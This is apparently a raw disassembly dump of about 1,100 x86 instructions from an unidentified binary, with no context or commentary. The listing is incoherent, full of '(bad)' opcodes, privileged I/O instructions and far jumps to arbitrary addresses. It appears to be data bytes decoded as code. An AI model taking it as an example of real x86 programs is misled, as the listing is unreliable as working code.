  4483c7:	add    BYTE PTR [ebp+0x44],ch
  4483ca:	push   esi
  4483cb:	or     ah,BYTE PTR [esi-0x2572f1e0]
  4483d1:	das    
  4483d2:	in     eax,dx
  4483d3:	push   0x71
  4483d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4483d6:	cld    
  4483d7:	ficom  DWORD PTR [eax]
  4483d9:	push   ds
  4483da:	fldcw  WORD PTR [eax]
  4483dc:	inc    edx
  4483dd:	inc    edx
  4483de:	jp     0x44842e
  4483e0:	dec    esp
  4483e1:	push   edx
  4483e2:	push   0x1c7c0f8a
  4483e7:	dec    ebx
  4483e8:	mov    BYTE PTR [eax-0x1c],bl
  4483eb:	pop    ss
  4483ec:	shr    dh,0x72
  4483ef:	sbb    al,0x92
  4483f1:	or     DWORD PTR [eax+eax*1],0xffffffc0
  4483f5:	push   0xffffffbd
  4483f7:	add    BYTE PTR [edi+0x68],dl
  4483fa:	(bad)  
  4483fb:	xchg   ebx,eax
  4483fc:	ss sar bl,cl
  4483ff:	retf   0x4489
  448402:	fwait
  448403:	push   ecx
  448404:	sbb    eax,0x46508745
  448409:	aam    0x4c
  44840b:	push   esp
  44840c:	mov    ebp,0x6f6340f8
  448411:	xchg   DWORD PTR [eax+eax*2],esp
  448414:	dec    esi
  448415:	sub    edx,DWORD PTR [eax]
  448417:	mov    ah,0xda
  448419:	inc    ebx
  44841a:	adc    BYTE PTR [edx],ch
  44841c:	ja     0x448482
  44841e:	mov    dl,0xdb
  448420:	shl    BYTE PTR [edi-0x45d9b87b],0x24
  448427:	xor    BYTE PTR [esi],bl
  448429:	and    ch,bl
  44842b:	and    al,0x94
  44842d:	retf   0x9894
  448430:	or     dl,BYTE PTR [edi+eiz*4]
  448433:	or     al,bl
  448435:	xchg   BYTE PTR [edx+0x1648d014],ah
  44843b:	inc    esp
  44843c:	push   ebp
  44843d:	in     eax,dx
  44843e:	sbb    dl,BYTE PTR [eax+0x47]
  448441:	test   BYTE PTR [eax],dl
  448443:	cli    
  448444:	mov    BYTE PTR [esp+eax*4],ah
  448447:	push   ds
  448448:	sbb    bl,BYTE PTR [edi+0x5e30e285]
  44844e:	in     eax,0x72
  448450:	outs   dx,BYTE PTR ds:[esi]
  448451:	xor    BYTE PTR [ebx],0xa9
  448454:	dec    edi
  448455:	adc    BYTE PTR [eax+0x6178193c],dl
  44845b:	jae    0x44841e
  44845d:	aad    0x78
  44845f:	in     al,0x2f
  448461:	mov    ah,0xfb
  448463:	add    BYTE PTR [ebp+0x36],ah
  448466:	nop
  448467:	sbb    eax,0x3c0c0f01
  44846c:	jmp    0x39237f11
  448471:	add    BYTE PTR [edx],cl
  448473:	and    al,0x8a
  448475:	sbb    bh,BYTE PTR [esi]
  448477:	popa   
  448478:	jle    0x448425
  44847a:	jne    0x44848e
  44847c:	inc    esp
  44847d:	push   0xffffffa0
  44847f:	add    eax,0x69cab00
  448484:	lock dec ecx
  448486:	add    al,0xc8
  448488:	je     0x4484a2
  44848a:	js     0x448410
  44848c:	adc    eax,0xa65fe017
  448491:	add    DWORD PTR [esi],ecx
  448493:	add    BYTE PTR [edi+0x3e041262],dh
  448499:	inc    eax
  44849a:	sbb    al,0x94
  44849c:	cmp    BYTE PTR [ecx],dl
  44849e:	pop    edi
  44849f:	add    ch,dl
  4484a1:	sbb    al,0xc0
  4484a3:	push   esi
  4484a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4484a5:	push   es
  4484a6:	pop    edx
  4484a7:	push   eax
  4484a8:	hlt    
  4484a9:	and    DWORD PTR [esi],eax
  4484ab:	dec    eax
  4484ac:	dec    edx
  4484ad:	test   eax,0xe0a8a084
  4484b2:	add    eax,0x29a21b5e
  4484b7:	fs out 0x49,al
  4484ba:	jns    0x448518
  4484bc:	pop    eax
  4484bd:	das    
  4484be:	or     al,0xb0
  4484c0:	adc    eax,0xd50cb023
  4484c5:	or     al,cl
  4484c7:	dec    eax
  4484c8:	ror    dh,0x1
  4484cb:	xchg   ebp,eax
  4484cc:	xchg   esp,eax
  4484cd:	ficom  DWORD PTR [ebx+0x45703044]
  4484d3:	pop    esi
  4484d4:	mov    dh,0x98
  4484d6:	inc    ebp
  4484d7:	cmp    al,0x2
  4484d9:	cmp    BYTE PTR [esi-0x2],0x61
  4484dd:	xor    al,0x88
  4484df:	add    eax,ebx
  4484e1:	in     al,dx
  4484e2:	cmp    eax,0xa929d532
  4484e7:	dec    esp
  4484e8:	sub    BYTE PTR [ebx],dh
  4484ea:	sub    al,0x68
  4484ec:	ss icebp 
  4484ee:	repnz cwde 
  4484f0:	in     eax,0xc0
  4484f2:	sbb    BYTE PTR [esi],ch
  4484f4:	test   al,0x26
  4484f6:	scas   al,BYTE PTR es:[edi]
  4484f7:	and    DWORD PTR [edx],ebp
  4484f9:	xchg   ecx,eax
  4484fa:	mov    eax,0x7e244707
  4484ff:	mov    BYTE PTR [edx-0x787d3ecf],cl
  448505:	test   eax,0xfa6c49f8
  44850a:	scas   al,BYTE PTR es:[edi]
  44850b:	mov    bh,0xc4
  44850d:	rsm    
  44850f:	loop   0x44858a
  448511:	and    DWORD PTR [ecx+0x76ca8499],esp
  448517:	push   es
  448518:	loop   0x448573
  44851a:	clc    
  44851b:	pop    eax
  44851c:	test   BYTE PTR [ecx],0xfc
  44851f:	bound  edx,QWORD PTR [edx+0x68ad9adb]
  448525:	adc    BYTE PTR [ebx-0x36],ch
  448528:	je     0x44853c
  44852a:	call   0x54730b81
  44852f:	pop    ecx
  448530:	sub    BYTE PTR [ebx-0x6fbbf87c],dh
  448536:	adc    dl,BYTE PTR [ebx-0x36]
  448539:	jle    0x448596
  44853b:	adc    eax,0x42a1c295
  448540:	mov    eax,0x3ea0fe8
  448545:	shr    BYTE PTR [ebx],1
  448547:	es mov edi,0xec932bf
  44854d:	and    al,0x6c
  44854f:	mov    dh,0xba
  448551:	inc    edi
  448552:	dec    edx
  448553:	mov    al,ds:0x16247ed0
  448558:	xchg   ebx,eax
  448559:	addr16 push eax
  44855b:	sbb    eax,0xb0d7d4a2
  448560:	mov    dl,0xf1
  448562:	adc    esp,eax
  448564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448565:	shr    BYTE PTR [ebp+ebx*2+0x6d4fc47a],1
  44856c:	js     0x4485c0
  44856e:	jp     0x44852c
  448570:	jns    0x448574
  448572:	dec    esp
  448573:	scas   eax,DWORD PTR es:[edi]
  448574:	cmc    
  448575:	xchg   DWORD PTR [eax+0x7a728f55],ecx
  44857b:	test   al,0x9d
  44857d:	xchg   edi,eax
  44857e:	or     al,0x86
  448580:	pop    eax
  448581:	xchg   esp,eax
  448582:	loope  0x44850f
  448584:	push   ss
  448585:	add    al,BYTE PTR [esp+eax*1+0x5a]
  448589:	xchg   edi,eax
  44858a:	loope  0x448590
  44858c:	inc    esi
  44858d:	int3   
  44858e:	adc    ch,cl
  448590:	lods   al,BYTE PTR ds:[esi]
  448591:	sbb    eax,0x5ce40eb6
  448596:	adc    DWORD PTR [eax-0x6a16d85f],edx
  44859c:	(bad)  
  44859d:	and    BYTE PTR [eax+0x52],0x22
  4485a1:	or     BYTE PTR [edi+0x26],0xaa
  4485a5:	xchg   BYTE PTR [ecx+0x20],bh
  4485a8:	cwde   
  4485a9:	push   ecx
  4485aa:	sbb    eax,0x9023c16d
  4485af:	adc    edx,DWORD PTR [eax-0x7c839699]
  4485b5:	xor    BYTE PTR [ebx],al
  4485b7:	gs mov edi,0x8900cd8c
  4485bd:	(bad)  
  4485be:	(bad)  
  4485bf:	loop   0x448564
  4485c1:	push   esi
  4485c2:	add    al,0xd7
  4485c4:	xor    BYTE PTR [esi+0x4b387f86],0x84
  4485cb:	mov    edi,0x6d4876d8
  4485d0:	pop    esi
  4485d1:	fs jnp 0x44860a
  4485d4:	aad    0x9a
  4485d6:	xor    dh,BYTE PTR [ecx-0x7d287f24]
  4485dc:	push   esi
  4485dd:	jl     0x4485de
  4485df:	les    ebp,FWORD PTR [eax+eax*1]
  4485e2:	stos   BYTE PTR es:[edi],al
  4485e3:	call   0x251:0xd2b5d2d3
  4485ea:	call   0x6acf5848
  4485ef:	sub    edx,eax
  4485f1:	xchg   esi,eax
  4485f2:	and    eax,0x90ce43ee
  4485f7:	mov    al,0xaa
  4485f9:	sbb    ch,ah
  4485fb:	push   edi
  4485fc:	xor    BYTE PTR [edx-0x7340bb07],ah
  448602:	inc    edi
  448603:	or     cl,BYTE PTR [edx+0x2af77ca2]
  448609:	fcmovb st,st(0)
  44860b:	ss xor al,0x27
  44860e:	mov    esp,0xc9ceea4c
  448613:	xchg   BYTE PTR [esp+edx*2+0x12b4943b],dl
  44861a:	sub    al,0x4d
  44861c:	mov    es,esp
  44861e:	xor    al,0x2a
  448620:	mov    al,BYTE PTR [edi+0xb]
  448623:	push   ebp
  448624:	mov    esp,0x70d3f288
  448629:	lods   al,BYTE PTR ds:[esi]
  44862a:	(bad)  
  44862b:	and    al,0xb4
  44862d:	lods   al,BYTE PTR ds:[esi]
  44862e:	pop    esi
  44862f:	inc    ebx
  448630:	add    cl,BYTE PTR [ecx]
  448632:	lods   al,BYTE PTR ds:[esi]
  448633:	push   ebp
  448634:	pusha  
  448635:	inc    ecx
  448636:	xlat   BYTE PTR ds:[ebx]
  448637:	xchg   ebp,eax
  448638:	fs mov ecx,0x2bcca8da
  44863e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44863f:	inc    ebx
  448640:	pop    ecx
  448641:	lahf   
  448642:	and    DWORD PTR [esi+0x3a],ebp
  448645:	ficomp WORD PTR [edx]
  448647:	ins    BYTE PTR es:[edi],dx
  448648:	dec    ebp
  448649:	mov    BYTE PTR [esi+0x62ab6a6c],ah
  44864f:	mov    ?,WORD PTR [eax+0x3d04abfa]
  448655:	dec    edx
  448656:	(bad)
  44865a:	hlt    
  44865b:	jb     0x4486bd
  44865d:	stos   BYTE PTR es:[edi],al
  44865e:	pop    edi
  44865f:	push   ss
  448660:	push   ss
  448661:	sahf   
  448662:	xlat   BYTE PTR ds:[ebx]
  448663:	inc    ebp
  448664:	mov    eax,0x2ea8da16
  448669:	add    eax,0xe23a1438
  44866e:	jbe    0x4486ca
  448670:	sahf   
  448671:	sub    BYTE PTR [esi+ebx*8+0x1c],ch
  448675:	leave  
  448676:	jl     0x448678
  448678:	jb     0x4486b0
  44867a:	out    0x94,al
  44867c:	and    al,0x91
  44867e:	ficom  DWORD PTR [esp+edx*4-0x3a4ff53c]
  448685:	or     BYTE PTR [esi+0x5be6f684],0x4b
  44868c:	inc    eax
  44868d:	data16 mov ah,dh
  448690:	lock inc esp
  448692:	or     BYTE PTR [ebp+0x73fe1b98],cl
  448698:	pop    es
  448699:	adc    ch,BYTE PTR [eax-0x7a57f70]
  44869f:	mov    DWORD PTR [esi+0x7],edx
  4486a2:	mov    BYTE PTR [eax],cl
  4486a4:	push   0x8
  4486a6:	mov    ch,0xa1
  4486a8:	dec    esi
  4486a9:	jmp    0x5a4e:0x4d36507c
  4486b0:	pop    edx
  4486b1:	or     ebx,ebx
  4486b3:	mov    al,ds:0x5ccde00a
  4486b8:	mov    ebp,0xaa3b4b0
  4486bd:	adc    DWORD PTR [eax+0x12],esp
  4486c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4486c1:	sahf   
  4486c2:	out    0xf7,al
  4486c4:	sbb    al,0x9a
  4486c6:	and    BYTE PTR cs:[esi],cl
  4486c9:	pop    esi
  4486ca:	pop    esi
  4486cb:	out    dx,al
  4486cc:	sub    al,0xe1
  4486ce:	xchg   ecx,eax
  4486cf:	shl    BYTE PTR [esi+0xc],1
  4486d2:	sbb    cl,BYTE PTR [ecx-0x1ae1fb90]
  4486d8:	das    
  4486d9:	dec    edi
  4486da:	dec    ebx
  4486db:	aas    
  4486dc:	dec    ecx
  4486dd:	ss and eax,0x1f1e4a93
  4486e3:	xor    al,0xda
  4486e5:	jns    0x44867b
  4486e7:	cli    
  4486e8:	fdivr  st(4),st
  4486ea:	pop    ebx
  4486eb:	and    al,0x9
  4486ed:	or     ecx,DWORD PTR [esi+eiz*1]
  4486f0:	mov    ah,0xc6
  4486f2:	popf   
  4486f3:	into   
  4486f4:	sub    DWORD PTR [ecx+ecx*1],edx
  4486f7:	jle    0x4486e3
  4486f9:	test   BYTE PTR [ebp+0x7c332024],0x4
  448700:	mov    cl,0x29
  448702:	clc    
  448703:	and    bl,BYTE PTR [ecx]
  448705:	pop    ebx
  448706:	xchg   esp,eax
  448707:	inc    eax
  448708:	cwde   
  448709:	inc    ecx
  44870a:	push   0x78
  44870c:	sub    al,0xa6
  44870e:	xor    ah,bh
  448710:	mov    ds:0xcd0589f5,al
  448715:	pop    esi
  448716:	inc    esi
  448717:	mov    dl,0xf1
  448719:	rol    BYTE PTR [edx-0x44a68dcd],1
  44871f:	icebp  
  448720:	pusha  
  448721:	loop   0x4486b6
  448723:	xchg   al,bh
  448725:	sbb    esi,esi
  448727:	push   eax
  448728:	sbb    BYTE PTR [edi-0x3c194eac],0x5a
  44872f:	gs dec edx
  448731:	and    eax,0x849f64b3
  448736:	call   0x435:0x404ab8e1
  44873d:	xchg   ebx,eax
  44873e:	stos   BYTE PTR es:[edi],al
  44873f:	jmp    0x2897:0x8536f89a
  448746:	xchg   edx,eax
  448747:	jmp    0x448765
  448749:	mov    edx,0x99a2494
  44874e:	jb     0x448784
  448750:	adc    ebx,DWORD PTR [edx-0x2ecf95ff]
  448756:	out    dx,al
  448757:	cmp    eax,0x9e9592a
  44875c:	adc    al,0x3e
  44875e:	fmul   QWORD PTR ss:[eax]
  448761:	adc    al,0x12
  448763:	adc    eax,0xc46556ad
  448768:	neg    DWORD PTR [esi-0x12]
  44876b:	nop
  44876c:	mov    bh,0x2b
  44876e:	dec    edx
  44876f:	fistp  DWORD PTR [esi-0x799a568a]
  448775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448776:	mov    BYTE PTR [edi-0x2fc9ff71],bh
  44877c:	cmp    cl,ah
  44877e:	and    BYTE PTR [edi],bl
  448780:	test   al,0x10
  448782:	lods   al,BYTE PTR ds:[esi]
  448783:	jnp    0x448706
  448785:	les    edx,FWORD PTR [esi+0x20]
  448788:	pushf  
  448789:	jb     0x448765
  44878b:	push   ss
  44878c:	mov    bh,0x60
  44878f:	cmp    eax,0xcd9e1e16
  448794:	mov    al,ds:0x78ce9c10
  448799:	and    al,0x3
  44879b:	scas   eax,DWORD PTR es:[edi]
  44879c:	push   eax
  44879d:	mov    ebx,0x585b3ea4
  4487a2:	inc    edi
  4487a3:	call   0xd578a305
  4487a8:	and    ch,dl
  4487aa:	or     bl,BYTE PTR [edi]
  4487ac:	test   BYTE PTR [esi],dh
  4487ae:	ret    
  4487af:	outs   dx,BYTE PTR ds:[esi]
  4487b0:	ins    BYTE PTR es:[edi],dx
  4487b1:	repnz (bad) 
  4487b3:	aad    0xff
  4487b5:	fimul  WORD PTR [ebx-0x5ace25ee]
  4487bb:	int    0x9e
  4487bd:	cs retf 0x26e
  4487c1:	pop    esi
  4487c2:	inc    edx
  4487c3:	adc    eax,0xd8b42d80
  4487c8:	lock jo 0x4487e5
  4487cb:	push   0x3a
  4487cd:	sbb    al,0xf0
  4487cf:	xor    BYTE PTR [eax+0x4097e084],0xec
  4487d6:	int3   
  4487d7:	sbb    ebx,0x39063d48
  4487dd:	(bad)  
  4487df:	and    eax,0x8934970a
  4487e4:	pop    edi
  4487e5:	(bad)  
  4487e6:	stos   DWORD PTR es:[edi],eax
  4487e7:	xor    BYTE PTR [eax+0x34a35259],ah
  4487ed:	mov    esp,0x2354498
  4487f2:	xchg   ebx,eax
  4487f3:	hlt    
  4487f4:	sub    eax,0x1870f32c
  4487f9:	push   0x8dc259e1
  4487fe:	xchg   edi,eax
  4487ff:	xor    BYTE PTR [esi],dh
  448801:	mov    al,0x84
  448803:	xchg   ch,cl
  448805:	mov    al,0xb2
  448807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448808:	mov    eax,fs
  44880a:	mov    ecx,eax
  44880c:	add    BYTE PTR [edx],0xf8
  44880f:	aam    0xc6
  448811:	mov    BYTE PTR [ebp+0x1aadc699],0x5e
  448818:	hlt    
  448819:	push   eax
  44881a:	add    BYTE PTR [eax+eax*8+0x16],bh
  44881e:	cmp    ah,BYTE PTR [edi+eax*4]
  448821:	ins    BYTE PTR es:[edi],dx
  448822:	js     0x44888b
  448824:	lods   al,BYTE PTR ds:[esi]
  448825:	jmp    0xd1a5:0xdb433f1e
  44882c:	call   0x6b10b6e2
  448831:	jg     0x448812
  448833:	add    eax,0x524bad89
  448838:	ins    DWORD PTR es:[edi],dx
  448839:	(bad)  
  44883a:	and    BYTE PTR [edx],ch
  44883c:	push   ss
  44883d:	mov    BYTE PTR [eax],dl
  44883f:	pusha  
  448840:	shl    eax,0x10
  448843:	xchg   ebp,eax
  448844:	retf   
  448845:	push   0x68
  448847:	xlat   BYTE PTR ds:[ebx]
  448848:	cmp    BYTE PTR [edi+0x76],bl
  44884b:	fwait
  44884c:	enter  0x4c05,0x62
  448850:	stos   DWORD PTR es:[edi],eax
  448851:	jb     0x4488c9
  448853:	push   ds
  448854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448855:	add    bh,0x36
  448858:	mov    edx,0x6e7156ad
  44885d:	imul   esp,DWORD PTR [eax+edi*1+0x58],0x37cb870
  448865:	clc    
  448866:	add    ch,dl
  448868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448869:	jmp    0x3e5f0658
  44886e:	imul   edx,DWORD PTR [esp+ecx*8],0x1a4886a8
  448875:	xor    ebp,DWORD PTR [eax-0x61e66ada]
  44887b:	mov    WORD PTR [esi-0xc],fs
  44887e:	test   BYTE PTR [edx-0x65e6fbe3],cl
  448884:	icebp  
  448885:	stos   DWORD PTR es:[edi],eax
  448886:	ror    BYTE PTR [edx],0xf6
  448889:	dec    eax
  44888a:	cli    
  44888b:	sub    DWORD PTR ds:0x4aa91bca,0x4228e8a6
  448895:	and    eax,0x2fe6b4
  44889a:	jmp    0xca9a1764
  44889f:	je     0x4488a5
  4488a1:	ror    DWORD PTR [eax+edx*4],1
  4488a4:	sbb    ah,BYTE PTR [edx]
  4488a6:	xor    BYTE PTR [esi-0x2b21beb3],ch
  4488ac:	out    dx,eax
  4488ad:	mov    dl,0xc7
  4488af:	pop    eax
  4488b0:	mov    eax,ds:0x543fd6a2
  4488b5:	sub    BYTE PTR [ebp+0x4250bef0],bl
  4488bb:	adc    BYTE PTR [eax],dl
  4488bd:	fsubp  st(0),st
  4488bf:	inc    esp
  4488c0:	jae    0x448914
  4488c2:	sub    ah,cl
  4488c4:	(bad)  
  4488c5:	push   0x1c
  4488c7:	aam    0x13
  4488c9:	sub    al,BYTE PTR [ebx+ecx*2+0x1011207a]
  4488d0:	push   esp
  4488d1:	add    al,0xe3
  4488d3:	mov    WORD PTR [ebx+0xe],es
  4488d6:	add    al,0xd4
  4488d8:	fsub   st(2),st
  4488da:	cmp    ah,al
  4488dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4488dd:	lock test al,0xc
  4488e0:	cmp    dl,BYTE PTR [eax+ecx*4-0x6daf692a]
  4488e7:	cmp    eax,0xd6d2bb13
  4488ec:	loopne 0x4488ee
  4488ee:	repnz and BYTE PTR [ebx-0x36],bh
  4488f2:	in     al,dx
  4488f3:	out    0xd0,eax
  4488f5:	push   ds
  4488f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4488f7:	pop    edi
  4488f8:	sbb    bl,BYTE PTR [ebp+0x52]
  4488fb:	sub    al,0x15
  4488fd:	fmul   QWORD PTR [ecx]
  4488ff:	push   0x52
  448901:	push   ebx
  448902:	rol    DWORD PTR [esi+0x4264eeb8],cl
  448908:	and    ch,BYTE PTR [eax-0x7f8256f8]
  44890e:	mov    ah,0x45
  448910:	sub    BYTE PTR [edx+edx*4+0x3e505301],ah
  448917:	stos   BYTE PTR es:[edi],al
  448918:	mov    ah,0xcd
  44891a:	push   esp
  44891b:	je     0x448991
  44891d:	call   0xf30d8e54
  448922:	sbb    bl,al
  448924:	fdiv   QWORD PTR [ecx-0x4f]
  448927:	xor    eax,0x2fe41554
  44892c:	shl    BYTE PTR [eax-0x62],0xa0
  448930:	mov    BYTE PTR [edx],ah
  448932:	in     al,dx
  448933:	sbb    ecx,DWORD PTR [edx]
  448935:	ficomp WORD PTR [esi+0x6c402e84]
  44893b:	xor    BYTE PTR [eax],al
  44893d:	lods   eax,DWORD PTR ds:[esi]
  44893e:	and    al,0xdb
  448940:	push   0xf8345321
  448945:	inc    esp
  448946:	or     dl,bl
  448948:	leave  
  448949:	adc    edi,ebx
  44894b:	mov    edi,0x56c3a00d
  448950:	sbb    al,0x57
  448952:	imul   esp,edx,0x7d001bd8
  448958:	adc    BYTE PTR [esi+edx*1-0x7d],0x18
  44895d:	push   edi
  44895e:	fwait
  44895f:	push   ecx
  448960:	sub    BYTE PTR [esi],ah
  448962:	scas   al,BYTE PTR es:[edi]
  448963:	clc    
  448964:	in     eax,dx
  448965:	rol    BYTE PTR [ecx+ecx*8-0x3f90754a],cl
  44896c:	(bad)  
  44896d:	fdiv   QWORD PTR [ebx+0x1c92fddc]
  448973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448974:	push   eax
  448975:	inc    eax
  448976:	test   al,0xcc
  448978:	cmp    DWORD PTR [esi-0x5a],edi
  44897b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44897c:	aaa    
  44897d:	mov    BYTE PTR [edi],bl
  44897f:	mov    BYTE PTR [edi],bl
  448981:	(bad)  
  448982:	(bad)  
  448983:	push   esi
  448984:	pusha  
  448985:	xor    BYTE PTR [eax+0x66],dl
  448988:	hlt    
  448989:	cwde   
  44898a:	clc    
  44898b:	addr16 mov dl,0xe3
  44898e:	dec    edx
  44898f:	ror    BYTE PTR [esi+0x325bccba],0x62
  448996:	fild   WORD PTR [ebx+0x38]
  448999:	and    BYTE PTR [ebp-0x6b3afaac],dh
  44899f:	dec    edx
  4489a0:	push   ecx
  4489a1:	pop    ds
  4489a2:	or     DWORD PTR ds:0x7ba2091a,edx
  4489a8:	sbb    dl,BYTE PTR ds:0xf467a989
  4489ae:	test   DWORD PTR [eax-0x49f01d44],0x2c082d3a
  4489b8:	jl     0x448989
  4489ba:	jecxz  0x4489f3
  4489bc:	lods   al,BYTE PTR ds:[esi]
  4489bd:	or     BYTE PTR [esi+0x4bd415d8],0xe2
  4489c4:	push   ds
  4489c5:	sbb    al,al
  4489c7:	dec    edi
  4489c8:	scas   al,BYTE PTR es:[edi]
  4489c9:	fbld   TBYTE PTR [edx+0xa]
  4489cc:	jnp    0x4489c6
  4489ce:	add    eax,0x1cd6af63
  4489d3:	sbb    ah,dh
  4489d5:	sti    
  4489d6:	xor    ebp,ecx
  4489d8:	xor    ecx,DWORD PTR [ecx+eax*2-0x5b]
  4489dc:	gs jg  0x4489a5
  4489df:	xchg   DWORD PTR [esi+ebp*8+0x1b185e07],eax
  4489e6:	mov    WORD PTR [edx+0x6c9ccc06],gs
  4489ec:	jbe    0x448a07
  4489ee:	aam    0x3
  4489f0:	call   0x1c676cc8
  4489f5:	call   0x5286:0xe9c150d5
  4489fc:	push   ss
  4489fd:	push   es
  4489fe:	imul   edi,DWORD PTR [eax],0x6b8ac29c
  448a04:	push   eax
  448a05:	les    eax,FWORD PTR [esp+edx*4]
  448a08:	push   cs
  448a09:	and    BYTE PTR [edx+0x58433e96],bh
  448a0f:	dec    esp
  448a10:	sbb    ebx,DWORD PTR [eax+0x36]
  448a13:	push   0x2490a292
  448a18:	ins    DWORD PTR es:[edi],dx
  448a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448a1a:	call   0xc4df:0xa823dbd7
  448a21:	mov    esi,0x1630eabc
  448a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448a27:	mov    ebp,0x1c9ab26b
  448a2c:	inc    edx
  448a2d:	dec    esp
  448a2e:	in     al,dx
  448a2f:	and    al,bl
  448a31:	call   0x3ec6:0xef9a3bc
  448a38:	push   ds
  448a39:	add    BYTE PTR [esi-0x63],ah
  448a3c:	fsubr  QWORD PTR [edx]
  448a3e:	ja     0x448a40
  448a40:	lahf   
  448a41:	mov    edx,0xcd402680
  448a46:	cmp    dh,BYTE PTR [esi+edx*4-0x4715a572]
  448a4d:	xchg   BYTE PTR [edx+0x5868a229],al
  448a53:	sti    
  448a54:	fs test al,0x70
  448a57:	in     al,dx
  448a58:	cld    
  448a59:	inc    ebp
  448a5a:	test   DWORD PTR [esi-0x22],ebx
  448a5d:	push   ss
  448a5e:	cmp    esp,DWORD PTR [edx-0x2e219a56]
  448a64:	sub    BYTE PTR [ebp-0x2a],cl
  448a67:	sbb    eax,edx
  448a69:	inc    si
  448a6b:	data16 mov bh,BYTE PTR [esi+0x90d8ad1]
  448a72:	mov    ch,0xed
  448a74:	inc    esi
  448a75:	cld    
  448a76:	jbe    0x448ace
  448a78:	enter  0xf2ca,0xb2
  448a7c:	mov    ah,0xe9
  448a7e:	dec    eax
  448a7f:	jo     0x448a27
  448a81:	neg    bl
  448a83:	sbb    al,0xc9
  448a85:	push   eax
  448a86:	mov    edi,0xfa80fc29
  448a8b:	jg     0x448a68
  448a8d:	xchg   esi,eax
  448a8e:	mov    bl,0xa3
  448a90:	or     ah,BYTE PTR [ecx+0x4460107]
  448a96:	sahf   
  448a97:	jno    0x448af6
  448a99:	loop   0x448a3c
  448a9b:	aad    0xa6
  448a9d:	inc    ecx
  448a9e:	je     0x448a39
  448aa0:	clc    
  448aa1:	mov    ds:0x1a10c3bb,al
  448aa6:	and    eax,0x7a15fe4
  448aab:	test   dh,bh
  448aad:	cmp    al,0x2c
  448aaf:	cs add al,cl
  448ab2:	jbe    0x448b0e
  448ab4:	jmp    0xd7ad6608
  448ab9:	xchg   DWORD PTR [eax],ecx
  448abb:	cli    
  448abc:	bound  edx,QWORD PTR [eax+0xb986316]
  448ac2:	xor    BYTE PTR cs:[ecx-0x48d9f94b],0x16
  448aca:	(bad)  
  448acb:	dec    esp
  448acc:	sub    eax,0xa864760f
  448ad1:	mov    ebp,0x70919b76
  448ad6:	mov    dh,0x46
  448ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448ad9:	cs push ss
  448adb:	push   esp
  448adc:	mov    DWORD PTR [ecx-0x2c7b9f04],ecx
  448ae2:	test   al,0x4e
  448ae4:	sub    esi,ebx
  448ae6:	push   es
  448ae7:	mov    cl,0xc3
  448ae9:	mov    eax,0xf346530c
  448aee:	mov    al,ds:0xf6051126
  448af3:	mov    al,ds:0x61ff34ca
  448af8:	jecxz  0x448aab
  448afa:	push   ss
  448afb:	xchg   ecx,eax
  448afc:	int    0x90
  448afe:	js     0x448b78
  448b00:	add    al,dl
  448b02:	lods   eax,DWORD PTR ds:[esi]
  448b03:	mov    ah,BYTE PTR [edx+0x35dc0963]
  448b09:	test   DWORD PTR ds:[edx],esp
  448b0c:	ins    DWORD PTR es:[edi],dx
  448b0d:	loop   0x448b22
  448b0f:	shl    BYTE PTR [edi+0x33],1
  448b12:	ss daa 
  448b14:	(bad)  
  448b15:	scas   ax,WORD PTR es:[edi]
  448b17:	push   ebp
  448b18:	dec    edx
  448b19:	(bad)  
  448b1a:	loop   0x448b86
  448b1c:	sbb    edx,esi
  448b1e:	loop   0x448ac8
  448b20:	sub    al,0x65
  448b22:	mov    ds:0x51580be1,eax
  448b27:	pop    esp
  448b28:	mov    ds:0x4bb4b6b8,al
  448b2d:	xchg   esi,eax
  448b2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448b2f:	jp     0x448aee
  448b31:	stos   BYTE PTR es:[edi],al
  448b32:	scas   al,BYTE PTR es:[edi]
  448b33:	mov    eax,ds:0x206c4587
  448b38:	(bad)  
  448b39:	cld    
  448b3a:	gs jmp 0xa6ca:0x257ac87d
  448b42:	adc    edi,DWORD PTR [eax+edx*2-0x4]
  448b46:	xor    BYTE PTR [ecx+0x52d8b615],dh
  448b4c:	cs dec ecx
  448b4e:	mov    al,ds:0xe1d4e272
  448b53:	xor    eax,0x67cd5021
  448b58:	pop    ebp
  448b59:	not    BYTE PTR [eax+0x9]
  448b5c:	imul   esp,DWORD PTR [eax+ebx*4+0x7948e8c0],0x28
  448b64:	adc    al,dh
  448b66:	or     dh,0xe
  448b69:	int3   
  448b6a:	inc    edx
  448b6b:	push   edx
  448b6c:	xor    edx,DWORD PTR [eax+0x5c]
  448b6f:	rcr    cl,1
  448b71:	(bad)
  448b75:	mov    al,ds:0x645bc22e
  448b7a:	in     al,dx
  448b7b:	pop    edx
  448b7c:	out    dx,eax
  448b7d:	jbe    0x448bdb
  448b7f:	push   ebx
  448b80:	push   0xffffffb8
  448b82:	hlt    
  448b83:	sbb    BYTE PTR [ecx+0x372867a8],bh
  448b89:	lods   al,BYTE PTR ds:[esi]
  448b8a:	pop    es
  448b8b:	xor    dl,BYTE PTR [eax-0x14]
  448b8e:	mov    edx,0xd6d48fc8
  448b93:	in     al,dx
  448b94:	(bad)  
  448b95:	scas   eax,DWORD PTR es:[edi]
  448b96:	sbb    al,0xd6
  448b98:	add    eax,0x8681126a
  448b9d:	mov    bl,0x59
  448b9f:	rcl    BYTE PTR [ebp+0x3e10c389],0x6d
  448ba6:	sub    cl,BYTE PTR [edx]
  448ba8:	call   0x7cd6:0xa8fc6a76
  448baf:	aaa    
  448bb0:	xor    al,0x10
  448bb2:	or     BYTE PTR [ebx+0x2d],bh
  448bb5:	test   eax,0x32be8376
  448bba:	js     0x448be4
